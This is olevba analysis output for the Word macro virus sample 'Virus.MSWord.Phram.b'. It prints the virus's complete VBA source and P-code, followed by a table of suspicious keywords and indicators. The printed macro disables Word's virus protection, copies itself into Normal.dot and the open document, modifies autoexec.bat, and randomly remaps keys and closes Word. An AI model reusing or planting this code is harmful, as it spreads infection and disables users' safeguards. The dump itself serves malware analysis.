olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Phram.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Phram.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()

'MyName = yGen
'WrittenBy = f0re

On Error Resume Next

CommandBars("Tools").Controls("macro").Visible = False
Application.EnableCancelKey = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Options.ConfirmConversions = 0

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "yGen") <> "phraming the world into the next millenium" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "yGen") = "phraming the world into the next millenium"
End If

NormalInstalled = False
ActiveInstalled = False

Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule

If NT.Lines(3, 1) = "'MyName = yGen" Then NormalInstalled = True
If AD.Lines(3, 1) = "'MyName = yGen" Then ActiveInstalled = True

If NormalInstalled = True And ActiveInstalled = True Then GoTo PhrameEnd

If NormalInstalled = False Then
    Set Infection = NT
    Set Carrier = AD
    Vircode = "Sub Document_Open()" & Chr(13) & Chr(10)
Else
    Set Infection = AD
    Set Carrier = NT
    Vircode = "Sub Document_Close()" & Chr(13) & Chr(10)
End If

With Carrier
    For X = 2 To .CountOfLines
        Vircode = Vircode & .Lines(X, 1) & Chr(13) & Chr(10)
        If .Lines(X, 1) = "End Sub" Then Exit For
    Next X
End With

With Infection
        .DeleteLines 1, .CountOfLines
        .InsertLines 1, Vircode
End With

If Norminstalled = False Then NormalTemplate.Save
If ActiveInstalled = False Then ActiveDocument.Save

PhrameEnd:

Root = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "SystemRoot")
Targ = Mid(Root, 1, 3)

Open Targ + "autoexec.bat" For Append As #1
        Print #1, "pause"
Close #1

Rndnm = Int((Rnd() * 15) + 1)
If Rndnm = 15 Then

    Selection.EndKey Unit:=wdStory
    Selection.TypeParagraph
    Selection.Font.ColorIndex = wdWhite
    Selection.TypeText "phraming the world into the next millenium"
    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
    Selection.HomeKey Unit:=wdLine
    Selection.MoveRight Unit:=wdCharacter, Count:=42, Extend:=wdExtend
    Selection.LanguageID = wdNoProofing
    Selection.HomeKey Unit:=wdStory

    ToolsCustomizeKeyboard.KeyCode = 27
    ToolsCustomizeKeyboard.Category = 1
    ToolsCustomizeKeyboard.Name = "Cancel"
    ToolsCustomizeKeyboard.Remove
    ToolsCustomizeKeyboard.Context = 0
    
    SendKeys "%" + "{F4}"

End If

End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Phram.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5010 bytes
' Line #0:
' 	FuncDefn (Sub Document_Close())
' Line #1:
' Line #2:
' 	QuoteRem 0x0000 0x000D "MyName = yGen"
' Line #3:
' 	QuoteRem 0x0000 0x0010 "WrittenBy = f0re"
' Line #4:
' Line #5:
' 	OnError (Resume Next) 
' Line #6:
' Line #7:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #8:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #9:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #10:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #11:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #12:
' Line #13:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0004 "yGen"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x002A "phraming the world into the next millenium"
' 	Ne 
' 	IfBlock 
' Line #14:
' 	LitStr 0x002A "phraming the world into the next millenium"
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0004 "yGen"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #15:
' 	EndIfBlock 
' Line #16:
' Line #17:
' 	LitVarSpecial (False)
' 	St NormalInstalled 
' Line #18:
' 	LitVarSpecial (False)
' 	St ActiveInstalled 
' Line #19:
' Line #20:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #21:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #22:
' Line #23:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000E "'MyName = yGen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormalInstalled 
' 	EndIf 
' Line #24:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000E "'MyName = yGen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActiveInstalled 
' 	EndIf 
' Line #25:
' Line #26:
' 	Ld NormalInstalled 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveInstalled 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo PhrameEnd 
' 	EndIf 
' Line #27:
' Line #28:
' 	Ld NormalInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #29:
' 	SetStmt 
' 	Ld NT 
' 	Set Infection 
' Line #30:
' 	SetStmt 
' 	Ld AD 
' 	Set Carrier 
' Line #31:
' 	LitStr 0x0013 "Sub Document_Open()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Vircode 
' Line #32:
' 	ElseBlock 
' Line #33:
' 	SetStmt 
' 	Ld AD 
' 	Set Infection 
' Line #34:
' 	SetStmt 
' 	Ld NT 
' 	Set Carrier 
' Line #35:
' 	LitStr 0x0014 "Sub Document_Close()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Vircode 
' Line #36:
' 	EndIfBlock 
' Line #37:
' Line #38:
' 	StartWithExpr 
' 	Ld Carrier 
' 	With 
' Line #39:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	MemLdWith CountOfLines 
' 	For 
' Line #40:
' 	Ld Vircode 
' 	Ld X 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Vircode 
' Line #41:
' 	Ld X 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #42:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #43:
' 	EndWith 
' Line #44:
' Line #45:
' 	StartWithExpr 
' 	Ld Infection 
' 	With 
' Line #46:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #47:
' 	LitDI2 0x0001 
' 	Ld Vircode 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #48:
' 	EndWith 
' Line #49:
' Line #50:
' 	Ld Norminstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #51:
' 	Ld ActiveInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #52:
' Line #53:
' 	Label PhrameEnd 
' Line #54:
' Line #55:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St Root 
' Line #56:
' 	Ld Root 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	ArgsLd Mid$ 0x0003 
' 	St Targ 
' Line #57:
' Line #58:
' 	Ld Targ 
' 	LitStr 0x000C "autoexec.bat"
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #59:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "pause"
' 	PrintItemNL 
' Line #60:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #61:
' Line #62:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x000F 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St Rndnm 
' Line #63:
' 	Ld Rndnm 
' 	LitDI2 0x000F 
' 	Eq 
' 	IfBlock 
' Line #64:
' Line #65:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0001 
' Line #66:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #67:
' 	Ld wdWhite 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #68:
' 	LitStr 0x002A "phraming the world into the next millenium"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #69:
' 	Ld wdAlignParagraphCenter 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #70:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #71:
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x002A 
' 	ParamNamed Count 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall MoveRight 0x0003 
' Line #72:
' 	Ld wdNoProofing 
' 	Ld Selection 
' 	MemSt LanguageID 
' Line #73:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #74:
' Line #75:
' 	LitDI2 0x001B 
' 	Ld ToolsCustomizeKeyboard 
' 	MemSt KeyCode 
' Line #76:
' 	LitDI2 0x0001 
' 	Ld ToolsCustomizeKeyboard 
' 	MemSt Category 
' Line #77:
' 	LitStr 0x0006 "Cancel"
' 	Ld ToolsCustomizeKeyboard 
' 	MemSt New 
' Line #78:
' 	Ld ToolsCustomizeKeyboard 
' 	ArgsMemCall Remove 0x0000 
' Line #79:
' 	LitDI2 0x0000 
' 	Ld ToolsCustomizeKeyboard 
' 	MemSt Context 
' Line #80:
' Line #81:
' 	LitStr 0x0001 "%"
' 	LitStr 0x0004 "{F4}"
' 	Add 
' 	ArgsCall SendKeys 0x0001 
' Line #82:
' Line #83:
' 	EndIfBlock 
' Line #84:
' Line #85:
' 	EndSub 
' Line #86:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

